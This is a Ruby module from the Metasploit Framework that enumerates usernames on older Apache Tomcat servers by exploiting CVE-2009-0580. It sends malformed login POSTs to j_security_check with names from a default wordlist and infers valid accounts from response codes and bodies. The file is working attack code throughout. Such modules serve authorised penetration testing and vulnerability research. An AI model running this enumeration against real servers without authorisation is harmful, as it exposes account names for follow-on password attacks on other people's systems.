##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::AuthBrute

	def initialize
		super(
			'Name'           => 'Apache Tomcat User Enumeration',
			'Description'    => %q{
					This module enumerates Apache Tomcat's usernames via malformed requests to
				j_security_check, which can be found in the web administration package. It should
				work against Tomcat servers 4.1.0 - 4.1.39, 5.5.0 - 5.5.27, and 6.0.0 - 6.0.18.
				Newer versions no longer have the "admin" package by default. The 'admin' package
				is no longer provided for Tomcat 6 and later versions.
			},
			'Author'         =>
				[
					'Alligator Security Team',
					'Heyder Andrade <heyder.andrade[at]gmail.com>',
					'Leandro Oliveira <leandrofernando[at]gmail.com>'
				],
			'References'     =>
				[
					['BID', '35196'],
					['CVE', '2009-0580'],
					['OSVDB', '55055'],
				],
			'License'        =>  MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(8080),
				OptString.new('URI', [true, 'The path of the Apache Tomcat Administration page', '/admin/j_security_check']),
				OptPath.new('USER_FILE',  [ true, "File containing users, one per line",
					File.join(Msf::Config.install_root, "data", "wordlists", "tomcat_mgr_default_users.txt") ]),
			], self.class)

		deregister_options('PASSWORD','PASS_FILE','USERPASS_FILE','USER_AS_PASS','STOP_ON_SUCCESS','BLANK_PASSWORDS','USERNAME')
	end

	def target_url
		uri = normalize_uri(datastore['URI'])
		"http://#{vhost}:#{rport}#{uri}"
	end

	def has_j_security_check?
		vprint_status("#{target_url} - Checking j_security_check...")
		res = send_request_raw({'uri' => normalize_uri(datastore['URI'])})
		if res
			vprint_status("#{target_url} - Server returned: #{res.code.to_s}")
			return true if res.code == 200 or res.code == 302
		end

		false
	end

	def run_host(ip)
		unless has_j_security_check?
			print_error("#{target_url} - Unable to enumerate users with this URI")
			return
		end

		@users_found = {}

		each_user_pass { |user,pass|
			do_login(user)
		}

		if(@users_found.empty?)
			print_status("#{target_url} - No users found.")
		else
			print_good("#{target_url} - Users found: #{@users_found.keys.sort.join(", ")}")
			report_note(
				:host => rhost,
				:port => rport,
				:type => 'tomcat.users',
				:data => {:users =>  @users_found.keys.join(", ")}
			)
		end
	end

	def do_login(user)
		post_data = "j_username=#{user}&password=%"
		vprint_status("#{target_url} - Apache Tomcat - Trying name: '#{user}'")
		begin
			res = send_request_cgi(
				{
					'method'  => 'POST',
					'uri'     => normalize_uri(datastore['URI']),
					'data'    => post_data,
				}, 20)

			if res and res.code == 200 and res.headers['Set-Cookie']
				vprint_error("#{target_url} - Apache Tomcat #{user} not found ")
			elsif res and res.code == 200 and res.body =~ /invalid username/i
				vprint_error("#{target_url} - Apache Tomcat #{user} not found ")
			elsif res and res.code == 500
				# Based on: http://archives.neohapsis.com/archives/bugtraq/2009-06/0047.html
				vprint_good("#{target_url} - Apache Tomcat #{user} found ")
				@users_found[user] = :reported
			elsif res and res.body.empty? and res.headers['Location'] !~ /error\.jsp$/
				# Based on: http://archives.neohapsis.com/archives/bugtraq/2009-06/0047.html
				print_good("#{target_url} - Apache Tomcat #{user} found ")
				@users_found[user] = :reported
			else
				print_error("#{target_url} - NOT VULNERABLE")
				return :abort
			end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE
			print_error("#{target_url} - UNREACHABLE")
			return :abort
		end
	end

end

=begin

If your Tomcat doesn't have the admin package by default, download it here:
http://archive.apache.org/dist/tomcat/	

The package name should look something like: apache-tomcat-[version]-admin.zip

=end
